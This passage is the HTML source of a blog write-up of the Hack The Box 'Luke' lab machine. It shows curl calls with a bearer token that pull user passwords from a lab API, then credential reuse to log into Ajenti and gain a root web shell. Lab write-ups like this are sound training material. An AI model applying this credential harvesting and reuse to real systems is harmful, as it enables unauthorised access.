+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/media/sf_Research#</span><span class="w"> </span>curl <span class="nt">-H</span> <span class="s1">'Accept: application/json'</span> <span class="nt">-H</span> <span class="s2">"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYwNjQ4MDYwLCJleHAiOjE1NjA3MzQ0NjB9.mnXdriQeks-RRVtUmC5BnNl-P_HWWXhsb9fVQdJLmLI"</span> http://10.10.10.137:3000/users/admin
+<span class="gp">{"name":"Admin","password":"WX5b7)&gt;</span>/rp<span class="nv">$U</span><span class="o">)</span>FW<span class="s2">"}
+</span></code></pre></div></div>
+
+<p>The admin password above doesn’t work on any of our login pages either, not in combination with any of our current usernames. So, after some head scratching there’s more CTF intuition required. Perhaps other users on the site have their own API endpoints?</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/media/sf_Research#</span><span class="w"> </span>curl <span class="nt">-H</span> <span class="s1">'Accept: application/json'</span> <span class="nt">-H</span> <span class="s2">"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYwNjQ4MDYwLCJleHAiOjE1NjA3MzQ0NjB9.mnXdriQeks-RRVtUmC5BnNl-P_HWWXhsb9fVQdJLmLI"</span> http://10.10.10.137:3000/users/derry
+<span class="go">{"name":"Derry","password":"rZ86wwLvx7jUxtch"}
+
+</span><span class="gp">root@kali:/media/sf_Research#</span><span class="w"> </span>curl <span class="nt">-H</span> <span class="s1">'Accept: application/json'</span> <span class="nt">-H</span> <span class="s2">"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYwNjQ4MDYwLCJleHAiOjE1NjA3MzQ0NjB9.mnXdriQeks-RRVtUmC5BnNl-P_HWWXhsb9fVQdJLmLI"</span> http://10.10.10.137:3000/users/yuri
+<span class="go">{"name":"Yuri","password":"bet@tester87"}
+
+</span><span class="gp">root@kali:/media/sf_Research#</span><span class="w"> </span>curl <span class="nt">-H</span> <span class="s1">'Accept: application/json'</span> <span class="nt">-H</span> <span class="s2">"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYwNjQ4MDYwLCJleHAiOjE1NjA3MzQ0NjB9.mnXdriQeks-RRVtUmC5BnNl-P_HWWXhsb9fVQdJLmLI"</span> http://10.10.10.137:3000/users/dory
+<span class="go">{"name":"Dory","password":"5y:!xa=ybfe)/QD"}
+</span></code></pre></div></div>
+<p>This is great, we’ve expanded on our list of usernames a little, and our list of credentials significantly. Lets recap what we have so far before we move on to try them out on the other login pages.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th><strong>Potential Users</strong></th>
+      <th><strong>Potential Passwords</strong></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>admin</td>
+      <td>WX5b7)&gt;/rp$U)FW</td>
+    </tr>
+    <tr>
+      <td>derry</td>
+      <td>rZ86wwLvx7jUxtch</td>
+    </tr>
+    <tr>
+      <td>dory</td>
+      <td>5y:!xa=ybfe)/QD</td>
+    </tr>
+    <tr>
+      <td>yuri</td>
+      <td>bet@tester87</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="management">Management</h3>
+<p>The credentials we have obtained are again tried out port <code class="highlighter-rouge">8000</code>, but none of them are getting us in. So, we move on to the <code class="highlighter-rouge">/management</code> directory of port <code class="highlighter-rouge">80</code>. Since derry is the administrator of the site (as determined by the letter we found) we try his first. They work when we capitalize the first letter of his username.</p>
+
+<p><img src="/wp-content/uploads/2019/07/luke/management.png" alt="/management directory, Username: Derry Password: rZ86wwLvx7jUxtch" /></p>
+
+<p>We see there’s another login page here, so we add that to our list. There is also the <code class="highlighter-rouge">config.php</code> file we’ve already seen before at the root of the web directory, and another configuration file <code class="highlighter-rouge">config.json</code>.</p>
+
+<p><img src="/wp-content/uploads/2019/07/luke/config_son.png" alt="Ajenti config.json" /></p>
+
+<p>There is also another password <code class="highlighter-rouge">KpMasng6S5EtTy9Z</code>. Lets try and login to Ajenti yet again, this time using the password we’ve just found. The username we’ll try first is root, because that’s also found in the configuration file.</p>
+
+<p><img src="/wp-content/uploads/2019/07/luke/ajenti_auth.png" alt="Logged into Ajenti, game over!" /></p>
+
+<h3 id="user--root">user &amp;&amp; root</h3>
+
+<p>Now that we’re logged into Ajenti the only thing left to do is grab the flags. There is a file manager we could use to do this by navigating to the flags, or uploading our own shell. There’s also a <code class="highlighter-rouge">Terminal</code> button on the menu, which allows us a root shell through the website, so lets use that.</p>
+
+<p>It doesn’t matter which flag we grab first, because this Ajenti web shell already has us as root! I chose to grab the root flag first due to excitement. We can’t ignore the user flag of course so lets grab that next. Now, I don’t know if they were joking, but I saw a discussion on HTB’s forum involving “privilege deescalation”. I hope it was, because getting the flag involves simply navigating to derry’s directory and looking at it.</p>
+
+<p><img src="/wp-content/uploads/2019/07/luke/user.png" alt="Luke root and user flags" /></p>
+
+<h2 id="conclusion">Conclusion</h2>
+<p>This box required a lot of enumeration. It required that we scan for files, and report <code class="highlighter-rouge">401</code> codes rather than ignoring them. Another lesson learned from this box was to save a list of user names and credentials as they’re discovered. This box used a mixture of the user names and credentials we were able to find, and only by combining them in various ways were we able to gain access to the system.</p>
+
+    
+
+
+
+<div class="post-tags">
+  
+    
+    <a href="/tags/#ctf">
+    
+      <span class="icon">
+        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 0h24v24H0z" fill="none"/>
+    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
+</svg>
+      </span>&nbsp;<span class="tag-name">CTF</span>
+    </a>
+  
+    
+    <a href="/tags/#hack-the-box">
+    
+      <span class="icon">
+        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 0h24v24H0z" fill="none"/>
+    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
+</svg>
+      </span>&nbsp;<span class="tag-name">Hack The Box</span>
+    </a>
+  
+    
+    <a href="/tags/#freebsd">
+    
+      <span class="icon">
+        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 0h24v24H0z" fill="none"/>
+    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
+</svg>
+      </span>&nbsp;<span class="tag-name">FreeBSD</span>
+    </a>
+  
+    
+    <a href="/tags/#privilege-escalation">
+    
+      <span class="icon">
+        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 0h24v24H0z" fill="none"/>
+    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
+</svg>
+      </span>&nbsp;<span class="tag-name">Privilege Escalation</span>
+    </a>
+  
+    
+    <a href="/tags/#json-web-token">
+    
+      <span class="icon">
+        <svg fill="#000000" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+    <path d="M0 0h24v24H0z" fill="none"/>
+    <path d="M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"/>
+</svg>
+      </span>&nbsp;<span class="tag-name">JSON Web Token</span>
+    </a>
+  
+</div>
+  </div>
+
+  
+  <section class="comments">
+    <h2>Comments</h2>
+    
+  <div id="disqus_thread">
+    <button class="disqus-load" onClick="loadDisqusComments()">
+      Load Comments
+    </button>
+  </div>
+  <script>
+
+  /**
+  *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW
+  *  TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+  *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT:s
+  *  https://disqus.com/admin/universalcode/#configuration-variables
+  */
+  var disqus_config = function () {
+      this.page.url = "http://0.0.0.0:4000/hack-the-box-luke-writeup/";  // Replace PAGE_URL with your page's canonical URL variable
+      this.page.identifier = "" || "http://0.0.0.0:4000/hack-the-box-luke-writeup/";// Replace PAGE_IDENTIFIER with your page's unique identifier variable
+  }
+  function loadDisqusComments() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = '//https-ryankozak-com.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+  }
+  </script>
+  <noscript>
+    Please enable JavaScript to view the
+    <a href="https://disqus.com/?ref_noscript">comments powered by Disqus</a>.
+  </noscript>
+
+
+
+  </section>
+
+  <section class="related">
+  <h2>Related Posts</h2>
+  <ul class="posts-list">
+    
+      <li>
+        <h3>
+          <a href="/luks-encrypted-arch-linux-on-pinebook-pro/">
+            Installing Arch Linux on the Pinebook Pro with LUKS Encrypted Root
+            <small>15 Dec 2020</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box-craft-traceback/">
+            Hack The Box - Traceback
+            <small>17 Aug 2020</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hack-the-box-craft-traverxec/">
+            Hack The Box - Traverxec
+            <small>12 Apr 2020</small>
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</section>
+
+</div>
+
+    </main>
+
+    
+  </body>
+</html>
